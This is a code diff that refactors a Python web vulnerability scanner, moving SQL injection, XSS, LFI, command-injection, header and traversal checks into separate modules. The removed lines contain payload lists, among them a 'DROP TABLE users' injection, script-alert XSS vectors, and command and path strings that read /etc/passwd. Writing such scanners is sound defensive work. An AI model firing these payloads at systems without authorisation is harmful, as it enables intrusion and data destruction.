@@ -2,7 +2,7 @@
 ReconScan Scan Command Module
 
 Main scanning functionality for web application vulnerability detection.
-Provides modular scanning capabilities for SQL injection, XSS, LFI, command injection, and more.
+Refactored for modularity and maintainability.
 """
 
 import asyncio
@@ -15,6 +15,15 @@ from urllib.parse import urlparse, urlencode, urlunparse, parse_qs, urljoin
 from datetime import datetime
 import json
 import re
+
+# Import modular scanning components
+from .scanning.false_positive_filters import FalsePositiveFilters
+from .scanning.vulnerability_scanners.sql_injection_scanner import SQLInjectionScanner
+from .scanning.vulnerability_scanners.xss_scanner import XSSScanner
+from .scanning.vulnerability_scanners.lfi_scanner import LFIScanner
+from .scanning.vulnerability_scanners.command_injection_scanner import CommandInjectionScanner
+from .scanning.vulnerability_scanners.security_headers_scanner import SecurityHeadersScanner
+from .scanning.vulnerability_scanners.directory_traversal_scanner import DirectoryTraversalScanner
 
 class ScanCommand:
     """
@@ -37,6 +46,17 @@ class ScanCommand:
         from scanner.config_loader import get_system_config
         self.system_config = get_system_config()
         self.config = self._load_scan_config()
+        
+        # Initialize false positive filters
+        self.false_positive_filters = FalsePositiveFilters()
+        
+        # Initialize vulnerability scanners
+        self.sql_scanner = SQLInjectionScanner(self.false_positive_filters, self.system_config)
+        self.xss_scanner = XSSScanner(self.false_positive_filters, self.system_config)
+        self.lfi_scanner = LFIScanner()
+        self.cmd_scanner = CommandInjectionScanner()
+        self.headers_scanner = SecurityHeadersScanner()
+        self.dir_scanner = DirectoryTraversalScanner()
         
         # Available scan modules
         self.available_modules = {
@@ -380,7 +400,7 @@ class ScanCommand:
     
     async def _run_module(self, session, module, params):
         """
-        Run a specific vulnerability scan module.
+        Run a specific vulnerability scan module using modular scanners.
         
         Args:
             session: aiohttp session
@@ -388,701 +408,31 @@ class ScanCommand:
             params (dict): Scan parameters
         """
         target = params['target']
+        verbose = params['verbose']
+        vulnerabilities = []
         
         if module == 'sqli':
-            await self._scan_sql_injection(session, target, params['verbose'])
+            vulnerabilities = await self.sql_scanner.scan(session, target, getattr(self, 'discovered_urls', None), verbose)
         elif module == 'xss':
-            await self._scan_xss(session, target, params['verbose'])
+            vulnerabilities = await self.xss_scanner.scan(session, target, verbose)
         elif module == 'lfi':
-            await self._scan_lfi(session, target, params['verbose'])
+            vulnerabilities = await self.lfi_scanner.scan(session, target, self.config, verbose)
         elif module == 'cmdinjection':
-            await self._scan_command_injection(session, target, params['verbose'])
+            vulnerabilities = await self.cmd_scanner.scan(session, target, verbose)
         elif module == 'headers':
-            await self._scan_security_headers(session, target, params['verbose'])
+            vulnerabilities = await self.headers_scanner.scan(session, target, verbose)
         elif module == 'dirtraversal':
-            await self._scan_directory_traversal(session, target, params['verbose'])
+            vulnerabilities = await self.dir_scanner.scan(session, target, verbose)
+        
+        # Add discovered vulnerabilities to results
+        for vulnerability in vulnerabilities:
+            self._add_vulnerability(vulnerability)
     
-    def _is_sql_injection_false_positive(self, test_url, param_name, payload=None):
-        """
-        Check if a URL/parameter combination is a known false positive for SQL injection.
-        Enhanced with comprehensive WordPress and CMS false positive detection.
-        
-        Args:
-            test_url (str): The URL being tested
-            param_name (str): Parameter name being tested
-            payload (str, optional): The payload being tested
-            
-        Returns:
-            dict: False positive information with reason and AI label, or None if not a false positive
-        """
-        parsed_url = urlparse(test_url)
-        path = parsed_url.path.lower()
-        query = parsed_url.query.lower()
-        
-        # 1. WordPress oEmbed REST API endpoints
-        if '/wp-json/oembed/' in path and param_name == 'url':
-            return {
-                'is_false_positive': True,
-                'reason': 'WordPress oEmbed API - URL parameter used for external embed requests, not SQL queries',
-                'ai_label': 'false_positive.sql_pattern_in_url_param',
-                'confidence': 'high'
-            }
-        
-        # 2. WordPress AJAX endpoints (admin-ajax.php)
-        if '/wp-admin/admin-ajax.php' in path:
-            if param_name in ['action', 'data', 'nonce', '_ajax_nonce', '_wpnonce']:
-                return {
-                    'is_false_positive': True,
-                    'reason': 'WordPress AJAX endpoint - legitimate plugin/theme communication',
-                    'ai_label': 'false_positive.legit_ajax_call',
-                    'confidence': 'high'
-                }
-        
-        # 3. WordPress XML-RPC endpoint
-        if '/xmlrpc.php' in path:
-            return {
-                'is_false_positive': True,
-                'reason': 'WordPress XML-RPC endpoint - used for pingbacks, Jetpack, and remote publishing',
-                'ai_label': 'false_positive.legit_xmlrpc_usage',
-                'confidence': 'medium'
-            }
-        
-        # 4. WordPress login endpoint (single attempts)
-        if '/wp-login.php' in path and param_name in ['log', 'pwd', 'redirect_to']:
-            return {
-                'is_false_positive': True,
-                'reason': 'WordPress login endpoint - legitimate authentication attempt',
-                'ai_label': 'false_positive.failed_login_single_attempt',
-                'confidence': 'medium'
-            }
-        
-        # 5. WordPress REST API endpoints that handle URL parameters safely
-        wordpress_safe_paths = [
-            '/wp-json/wp/v2/media',
-            '/wp-json/wp/v2/embed',
-            '/wp-json/oembed/1.0/embed',
-            '/wp-content/plugins/',
-            '/wp-includes/',
-            '/wp-json/wp/v2/posts',
-            '/wp-json/wp/v2/pages',
-            '/wp-json/wp/v2/users'
-        ]
-        
-        if any(safe_path in path for safe_path in wordpress_safe_paths):
-            if param_name in ['url', 'src', 'href', 'link', 'callback', 'format', 'context', 'embed']:
-                return {
-                    'is_false_positive': True,
-                    'reason': 'WordPress REST API endpoint - parameters handled safely by WordPress core',
-                    'ai_label': 'false_positive.wordpress_rest_api_safe_param',
-                    'confidence': 'high'
-                }
-        
-        # 6. Contact forms and message parameters
-        if param_name in ['message', 'comment', 'content', 'text', 'body'] and payload:
-            # Check if it's just user input with SQL terms (not actual injection)
-            harmless_sql_patterns = [
-                'drop table', 'select * from', 'union select', 'delete from'
-            ]
-            if any(pattern in payload.lower() for pattern in harmless_sql_patterns):
-                if 'contact' in path or 'form' in path or 'comment' in path:
-                    return {
-                        'is_false_positive': True,
-                        'reason': 'Contact form with SQL keywords in message - likely user testing or typing literally',
-                        'ai_label': 'false_positive.user_input_with_sql_terms',
-                        'confidence': 'medium'
-                    }
-        
-        # 7. Social media embed endpoints
-        social_embed_patterns = [
-            '/embed/', '/oembed/', '/api/oembed', '/services/oembed'
-        ]
-        
-        if any(pattern in path for pattern in social_embed_patterns):
-            if param_name in ['url', 'src', 'link', 'href']:
-                return {
-                    'is_false_positive': True,
-                    'reason': 'Social media embed endpoint - URL parameters for external content embedding',
-                    'ai_label': 'false_positive.social_embed_url_param',
-                    'confidence': 'high'
-                }
-        
-        # 8. Known safe API endpoints that handle URLs
-        safe_api_patterns = [
-            '/api/v1/oembed',
-            '/api/v2/oembed', 
-            '/_oembed',
-            '/oembed.json',
-            '/oembed.xml',
-            '/api/embed',
-            '/preview'
-        ]
-        
-        if any(pattern in path for pattern in safe_api_patterns):
-            if param_name in ['url', 'src', 'link', 'href', 'callback']:
-                return {
-                    'is_false_positive': True,
-                    'reason': 'oEmbed/preview API endpoint - URL parameters for content fetching',
-                    'ai_label': 'false_positive.oembed_api_url_param',
-                    'confidence': 'high'
-                }
-        
-        # 9. Content Management System safe endpoints
-        cms_safe_patterns = [
-            '/drupal/oembed',
-            '/joomla/oembed',
-            '/typo3/oembed',
-            '/system/ajax',
-            '/admin/ajax'
-        ]
-        
-        if any(pattern in path for pattern in cms_safe_patterns):
-            if param_name in ['url', 'src', 'action', 'callback', 'data']:
-                return {
-                    'is_false_positive': True,
-                    'reason': 'CMS system endpoint - handled by framework with built-in protection',
-                    'ai_label': 'false_positive.cms_system_endpoint',
-                    'confidence': 'medium'
-                }
-        
-        # 10. URL-encoded HTML/JS tags in parameters (often for previews/embeds)
-        if payload and param_name in ['preview', 'content', 'html', 'embed_code']:
-            encoded_patterns = ['%3Cscript%3E', '%3Ciframe%3E', '%3Cimg%20', '<script>', '<iframe>', '<img ']
-            if any(pattern in payload.lower() for pattern in encoded_patterns):
-                return {
-                    'is_false_positive': True,
-                    'reason': 'HTML/JS tags in preview/embed parameter - likely for content preview, not execution',
-                    'ai_label': 'false_positive.encoded_html_tags_for_embed',
-                    'confidence': 'medium'
-                }
-        
-        # 11. Search parameters with SQL keywords (often user search terms)
-        if param_name in ['q', 'query', 'search', 's'] and payload:
-            if any(keyword in payload.lower() for keyword in ['select', 'union', 'drop', 'insert']):
-                return {
-                    'is_false_positive': True,
-                    'reason': 'Search parameter with SQL keywords - likely user search terms, not injection',
-                    'ai_label': 'false_positive.search_with_sql_keywords',
-                    'confidence': 'low'
-                }
-        
-        return None
 
-    def _is_xss_false_positive(self, test_url, param_name, payload=None):
-        """
-        Check if a URL/parameter combination is a known false positive for XSS.
-        
-        Args:
-            test_url (str): The URL being tested
-            param_name (str): Parameter name being tested
-            payload (str, optional): The payload being tested
-            
-        Returns:
-            dict: False positive information or None if not a false positive
-        """
-        parsed_url = urlparse(test_url)
-        path = parsed_url.path.lower()
-        
-        # HTML/JS in preview or embed parameters (often for content management)
-        if param_name in ['preview', 'content', 'html', 'embed_code', 'widget_content']:
-            return {
-                'is_false_positive': True,
-                'reason': 'HTML/JS content in preview/embed parameter - likely for content management, not execution',
-                'ai_label': 'false_positive.script_tag_in_url_but_not_executed',
-                'confidence': 'medium'
-            }
-        
-        # WordPress admin areas where HTML is expected
-        if '/wp-admin/' in path and param_name in ['content', 'excerpt', 'meta_value']:
-            return {
-                'is_false_positive': True,
-                'reason': 'WordPress admin area - HTML content expected in content management',
-                'ai_label': 'false_positive.html_in_admin_content',
-                'confidence': 'high'
-            }
-        
-        # oEmbed and embed services that may contain HTML
-        embed_patterns = ['/oembed', '/embed/', '/api/embed']
-        if any(pattern in path for pattern in embed_patterns):
-            if param_name in ['url', 'html', 'content', 'code']:
-                return {
-                    'is_false_positive': True,
-                    'reason': 'Embed service endpoint - HTML/JS expected for embed code generation',
-                    'ai_label': 'false_positive.embedded_html_for_service',
-                    'confidence': 'high'
-                }
-        
-        return None
 
-    async def _scan_sql_injection(self, session, target, verbose=True):
-        """Enhanced SQL injection detection using discovered URLs and parameters."""
-        if verbose:
-            print("  → Testing SQL injection payloads...")
-        
-        # Enhanced SQL injection payloads
-        payloads = [
-            "'",
-            "''",
-            "' OR '1'='1",
-            "' OR '1'='1' --",
-            "' OR '1'='1' /*",
-            "admin'--",
-            "admin' /*",
-            "' OR 1=1--",
-            "' UNION SELECT NULL--",
-            "1' OR '1'='1",
-            "1 OR 1=1",
-            "' OR 'x'='x",
-            "') OR ('1'='1",
-            "1' AND '1'='2",
-            "' WAITFOR DELAY '0:0:5'--",
-            "'; DROP TABLE users--"
-        ]
-        
-        vulnerabilities_found = 0
-        urls_to_test = []
-        
-        # Use discovered URLs if available, otherwise use common parameters
-        if hasattr(self, 'discovered_urls') and self.discovered_urls:
-            urls_to_test = self.discovered_urls
-        else:
-            # Fallback to common parameter names
-            parameters = ['id', 'user', 'username', 'page', 'cat', 'category', 'artist', 'search', 'q', 'query', 'name', 'login']
-            for param in parameters:
-                urls_to_test.append(f"{target}?{param}=1")
-        
-        for base_url in urls_to_test:
-            # Parse URL to extract parameters
-            parsed_url = urlparse(base_url)
-            params_dict = parse_qs(parsed_url.query)
-            
-            # Test each parameter in the URL
-            for param_name, param_values in params_dict.items():
-                for payload in payloads:
-                    try:
-                        # Create test URL with payload
-                        test_params = params_dict.copy()
-                        test_params[param_name] = [payload]
-                        test_query = urlencode(test_params, doseq=True)
-                        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
-                                             parsed_url.params, test_query, parsed_url.fragment))
-                        
-                        async with session.get(test_url) as response:
-                            content = await response.text()
-                            status_code = response.status
-                            
-                            # Enhanced SQL error detection
-                            error_indicators = [
-                                'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
-                                'SQLServer JDBC Driver', 'PostgreSQL query failed',
-                                'sqlite_master', 'SQL syntax', 'mysql_num_rows',
-                                'Warning: mysql', 'Warning: mysqli', 'MySQL Error',
-                                'ORA-00', 'Microsoft VBScript runtime', 'ADODB.Field',
-                                'mysql_connect', 'mysql_query', 'mysql_result',
-                                'PostgreSQL query failed', 'supplied argument is not a valid MySQL',
-                                'Column count doesn\'t match', 'mysql_fetch_assoc',
-                                'mysql_fetch_row', 'mysql_fetch_object', 'mysql_numrows',
-                                'Error Occurred While Processing Request', 'Server Error',
-                                'Microsoft OLE DB Provider for ODBC Drivers',
-                                'Invalid Querystring', 'OLE DB Provider for SQL Server',
-                                'Unclosed quotation mark after the character string',
-                                'Microsoft OLE DB Provider for Oracle', 'error in your SQL syntax',
-                                'Syntax error in query expression', 'Data source name not found',
-                                'Incorrect syntax near', 'mysql_error', 'mysql_errno',
-                                'Warning: pg_', 'valid PostgreSQL result', 'Npgsql\\.',
-                                'PG::SyntaxError', 'org.postgresql.util.PSQLException',
-                                'ERROR: parser: parse error', 'PostgreSQL.*ERROR',
-                                'Warning.*\\Wpg_', 'valid PostgreSQL result', 'Npgsql\\.',
-                                'Exception (Npgsql|PG|PostgreSQL)', 'Microsoft Access Driver',
-                                'JET Database Engine', 'Access Database Engine'
-                            ]
-                            
-                            # Check for SQL errors
-                            if any(indicator.lower() in content.lower() for indicator in error_indicators):
-                                # Check if this is a known false positive (if filtering is enabled)
-                                sql_config = self.system_config.get_payload_defaults('sql_injection')
-                                if sql_config.get('false_positive_filtering', True):
-                                    fp_result = self._is_sql_injection_false_positive(test_url, param_name, payload)
-                                    if fp_result:
-                                        if verbose:
-                                            print(f"     SQL injection pattern filtered ({fp_result['ai_label']}): {param_name}={payload}")
-                                            print(f"       Reason: {fp_result['reason']}")
-                                        continue
-                                
-                                vulnerability = {
-                                    'type': 'SQL Injection',
-                                    'severity': 'High',
-                                    'url': test_url,
-                                    'payload': payload,
-                                    'description': f'SQL injection vulnerability detected in parameter "{param_name}" through error-based testing'
-                                }
-                                if self._add_vulnerability(vulnerability):
-                                    vulnerabilities_found += 1
-                                    if verbose:
-                                        print(f"     SQL injection found: {param_name}={payload}")
-                                break
-                            
-                            # Check for boolean-based blind SQL injection
-                            elif payload in ["' OR '1'='1", "1 OR 1=1", "' OR 'x'='x"]:
-                                # Get baseline response with original parameter value
-                                baseline_params = params_dict.copy()
-                                baseline_query = urlencode(baseline_params, doseq=True)
-                                baseline_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path,
-                                                         parsed_url.params, baseline_query, parsed_url.fragment))
-                                
-                                async with session.get(baseline_url) as baseline_response:
-                                    baseline_content = await baseline_response.text()
-                                    
-                                    # If response is significantly different, might be vulnerable
-                                    if len(content) != len(baseline_content) and abs(len(content) - len(baseline_content)) > 100:
-                                        # Check if this is a known false positive (if filtering is enabled)
-                                        sql_config = self.system_config.get_payload_defaults('sql_injection')
-                                        if sql_config.get('false_positive_filtering', True):
-                                            fp_result = self._is_sql_injection_false_positive(test_url, param_name, payload)
-                                            if fp_result:
-                                                if verbose:
-                                                    print(f"     Boolean SQL injection pattern filtered ({fp_result['ai_label']}): {param_name}={payload}")
-                                                    print(f"       Reason: {fp_result['reason']}")
-                                                break
-                                        
-                                        vulnerability = {
-                                            'type': 'SQL Injection (Boolean-based)',
-                                            'severity': 'High',
-                                            'url': test_url,
-                                            'payload': payload,
-                                            'description': f'Potential boolean-based SQL injection in parameter "{param_name}"'
-                                        }
-                                        if self._add_vulnerability(vulnerability):
-                                            vulnerabilities_found += 1
-                                            if verbose:
-                                                print(f"     Boolean SQL injection found: {param_name}={payload}")
-                                        break
-                            
-                    except Exception as e:
-                        if verbose:
-                            print(f"    ! Error testing {param_name} with '{payload}': {str(e)}")
-                        continue
-        
-        if verbose and vulnerabilities_found == 0:
-            print("     No SQL injection vulnerabilities detected")
-    
-    async def _scan_xss(self, session, target, verbose=True):
-        """Enhanced XSS detection with multiple parameter testing."""
-        if verbose:
-            print("   Testing XSS payloads...")
-        
-        # Enhanced XSS payloads
-        payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<svg onload=alert('XSS')>",
-            "'><script>alert('XSS')</script>",
-            "\"><script>alert('XSS')</script>",
-            "<iframe src=javascript:alert('XSS')>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<select onfocus=alert('XSS') autofocus>",
-            "<textarea onfocus=alert('XSS') autofocus>",
-            "<keygen onfocus=alert('XSS') autofocus>",
-            "<video><source onerror=alert('XSS')>",
-            "<audio src=x onerror=alert('XSS')>",
-            "<details open ontoggle=alert('XSS')>",
-            "'-alert('XSS')-'",
-            "\";alert('XSS');//",
-            "</script><script>alert('XSS')</script>",
-            "<script>alert(String.fromCharCode(88,83,83))</script>",
-            "<img src=\"x\" onerror=\"alert('XSS')\">",
-            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
-        ]
-        
-        # Common parameter names for XSS testing
-        parameters = ['q', 'search', 'query', 'name', 'comment', 'message', 'text', 'input', 'data', 'value', 'content', 'title']
-        
-        vulnerabilities_found = 0
-        
-        for param in parameters:
-            for payload in payloads:
-                try:
-                    # Test with different parameters
-                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
-                    
-                    async with session.get(test_url) as response:
-                        content = await response.text()
-                        
-                        # Check if payload is reflected in response (various encodings)
-                        payload_variations = [
-                            payload,
-                            payload.replace("'", "&#x27;"),
-                            payload.replace("'", "&#39;"),
-                            payload.replace("\"", "&quot;"),
-                            payload.replace("<", "&lt;"),
-                            payload.replace(">", "&gt;"),
-                            payload.replace("&", "&amp;"),
-                            payload.lower(),
-                            payload.upper()
-                        ]
-                        
-                        if any(var in content for var in payload_variations):
-                            # Check if this is a known false positive (if filtering is enabled)
-                            xss_config = self.system_config.get_payload_defaults('xss')
-                            if xss_config.get('false_positive_filtering', True):
-                                fp_result = self._is_xss_false_positive(test_url, param, payload)
-                                if fp_result:
-                                    if verbose:
-                                        print(f"     XSS pattern filtered ({fp_result['ai_label']}): {param}={payload}")
-                                        print(f"       Reason: {fp_result['reason']}")
-                                    break
-                            
-                            vulnerability = {
-                                'type': 'Cross-Site Scripting (XSS)',
-                                'severity': 'Medium',
-                                'url': test_url,
-                                'payload': payload,
-                                'description': f'XSS vulnerability detected in parameter "{param}" through payload reflection'
-                            }
-                            if self._add_vulnerability(vulnerability):
-                                vulnerabilities_found += 1
-                                if verbose:
-                                    print(f"     XSS vulnerability found: {param}={payload}")
-                            break
-                            
-                except Exception as e:
-                    if verbose:
-                        print(f"    ! Error testing {param} with '{payload}': {str(e)}")
-                    continue
-        
-        if verbose and vulnerabilities_found == 0:
-            print("     No XSS vulnerabilities detected")
-    
-    async def _scan_lfi(self, session, target, verbose=True):
-        """Basic Local File Inclusion detection."""
-        if verbose:
-            print("  → Testing LFI payloads...")
-        
-        # Basic LFI payloads
-        payloads = [
-            "../../../../etc/passwd",
-            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "/etc/passwd",
-            "C:\\windows\\system32\\drivers\\etc\\hosts",
-            "../../../../etc/passwd%00",
-            "..\\..\\..\\..\\boot.ini"
-        ]
-        
-        vulnerabilities_found = 0
-        consecutive_errors = 0
-        max_consecutive_errors = 5  # Stop scan after 5 consecutive errors
-        
-        for payload in payloads:
-            try:
-                # Test with file parameter
-                test_url = f"{target}?file={urllib.parse.quote(payload)}"
-                
-                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=self.config.get('network', {}).get('timeout', 10))) as response:
-                    content = await response.text()
-                    
-                    # Reset error counter on successful request
-                    consecutive_errors = 0
-                    
-                    # Look for file inclusion indicators
-                    lfi_indicators = [
-                        'root:x:0:0:', '[boot loader]', 'localhost',
-                        '# This file contains', 'daemon:x:'
-                    ]
-                    
-                    if any(indicator in content for indicator in lfi_indicators):
-                        vulnerability = {
-                            'type': 'Local File Inclusion (LFI)',
-                            'severity': 'High',
-                            'url': test_url,
-                            'payload': payload,
-                            'description': 'LFI vulnerability detected through file content disclosure'
-                        }
-                        if self._add_vulnerability(vulnerability):
-                            vulnerabilities_found += 1
-                            if verbose:
-                                print(f"    ✗ LFI vulnerability found: {payload}")
-                        break
-                        
-            except asyncio.TimeoutError:
-                consecutive_errors += 1
-                if verbose and consecutive_errors <= max_consecutive_errors:
-                    print(f"    ! Timeout testing LFI payload (error {consecutive_errors})")
-                if consecutive_errors >= max_consecutive_errors:
-                    if verbose:
-                        print("    ! Too many consecutive timeouts, stopping LFI scan...")
-                    break
-            except aiohttp.ClientError as e:
-                consecutive_errors += 1
-                if verbose and consecutive_errors <= max_consecutive_errors:
-                    print(f"    ! Connection error during LFI test: {str(e)}")
-                if consecutive_errors >= max_consecutive_errors:
-                    if verbose:
-                        print("    ! Too many connection errors, stopping LFI scan...")
-                    break
-            except Exception as e:
-                consecutive_errors += 1
-                if verbose and consecutive_errors <= max_consecutive_errors:
-                    print(f"    ! Error testing payload '{payload[:30]}...': {str(e)}")
-                if consecutive_errors >= max_consecutive_errors:
-                    if verbose:
-                        print("    ! Too many consecutive errors, stopping LFI scan...")
-                    break
-                    
-            # Add small delay between requests
-            await asyncio.sleep(self.config.get('scanning', {}).get('delay', 0.5))
-        
-        if verbose and vulnerabilities_found == 0:
-            print("    ✓ No LFI vulnerabilities detected")
-    
-    async def _scan_command_injection(self, session, target, verbose=True):
-        """Basic command injection detection."""
-        if verbose:
-            print("  → Testing command injection payloads...")
-        
-        # Basic command injection payloads
-        payloads = [
-            "; ls",
-            "| whoami",
-            "&& id",
-            "; cat /etc/passwd",
-            "| ping -c 1 127.0.0.1",
-            "&& echo 'command_injection_test'"
-        ]
-        
-        vulnerabilities_found = 0
-        
-        for payload in payloads:
-            try:
-                # Test with cmd parameter
-                test_url = f"{target}?cmd={urllib.parse.quote(payload)}"
-                
-                async with session.get(test_url) as response:
-                    content = await response.text()
-                    
-                    # Look for command execution indicators
-                    cmd_indicators = [
-                        'uid=', 'gid=', 'root:x:0:0:', 'PING',
-                        'command_injection_test', 'total 0'
-                    ]
-                    
-                    if any(indicator in content for indicator in cmd_indicators):
-                        vulnerability = {
-                            'type': 'Command Injection',
-                            'severity': 'Critical',
-                            'url': test_url,
-                            'payload': payload,
-                            'description': 'Command injection vulnerability detected through command execution'
-                        }
-                        if self._add_vulnerability(vulnerability):
-                            vulnerabilities_found += 1
-                            if verbose:
-                                print(f"     Command injection found: {payload}")
-                        break
-                        
-            except Exception as e:
-                if verbose:
-                    print(f"    ! Error testing payload '{payload}': {str(e)}")
-                continue
-        
-        if verbose and vulnerabilities_found == 0:
-            print("    ✓ No command injection vulnerabilities detected")
-    
-    async def _scan_security_headers(self, session, target, verbose=True):
-        """Analyze security headers."""
-        if verbose:
-            print("  → Analyzing security headers...")
-        
-        try:
-            async with session.get(target) as response:
-                headers = response.headers
-                
-                # Check for important security headers
-                security_headers = {
-                    'X-Frame-Options': 'Clickjacking protection',
-                    'X-XSS-Protection': 'XSS filtering',
-                    'X-Content-Type-Options': 'MIME sniffing protection',
-                    'Content-Security-Policy': 'Content Security Policy',
-                    'Strict-Transport-Security': 'HTTPS enforcement',
-                    'Referrer-Policy': 'Referrer information control',
-                    'Feature-Policy': 'Feature access control'
-                }
-                
-                missing_headers = []
-                
-                for header, description in security_headers.items():
-                    if header not in headers:
-                        missing_headers.append(f"{header} ({description})")
-                
-                # Create single vulnerability for all missing headers
-                if missing_headers:
-                    vulnerability = {
-                        'type': 'Missing Security Headers',
-                        'severity': 'Low',
-                        'url': target,
-                        'payload': f"Missing {len(missing_headers)} headers",
-                        'description': f'Missing security headers: {", ".join(missing_headers)}'
-                    }
-                    self._add_vulnerability(vulnerability)
-                    
-                    if verbose:
-                        print(f"     Missing {len(missing_headers)} security headers")
-                else:
-                    if verbose:
-                        print("     All important security headers present")
-                        
-        except Exception as e:
-            if verbose:
-                print(f"    ! Error analyzing headers: {str(e)}")
-    
-    async def _scan_directory_traversal(self, session, target, verbose=True):
-        """Basic directory traversal detection."""
-        if verbose:
-            print("  → Testing directory traversal...")
-        
-        # Directory traversal payloads
-        payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\win.ini",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "....//....//....//etc/passwd"
-        ]
-        
-        vulnerabilities_found = 0
-        
-        for payload in payloads:
-            try:
-                test_url = f"{target}?path={urllib.parse.quote(payload)}"
-                
-                async with session.get(test_url) as response:
-                    content = await response.text()
-                    
-                    # Look for directory traversal indicators
-                    traversal_indicators = [
-                        'root:x:0:0:', '[fonts]', 'for 16-bit app support'
-                    ]
-                    
-                    if any(indicator in content for indicator in traversal_indicators):
-                        vulnerability = {
-                            'type': 'Directory Traversal',
-                            'severity': 'High',
-                            'url': test_url,
-                            'payload': payload,
-                            'description': 'Directory traversal vulnerability detected'
-                        }
-                        if self._add_vulnerability(vulnerability):
-                            vulnerabilities_found += 1
-                            if verbose:
-                                print(f"     Directory traversal found: {payload}")
-                        break
-                        
-            except Exception as e:
-                if verbose:
-                    print(f"    ! Error testing payload '{payload}': {str(e)}")
-                continue
-        
-        if verbose and vulnerabilities_found == 0:
-            print("    ✓ No directory traversal vulnerabilities detected")
+
+
+
     
     def _generate_summary(self):
         """Generate scan summary statistics."""
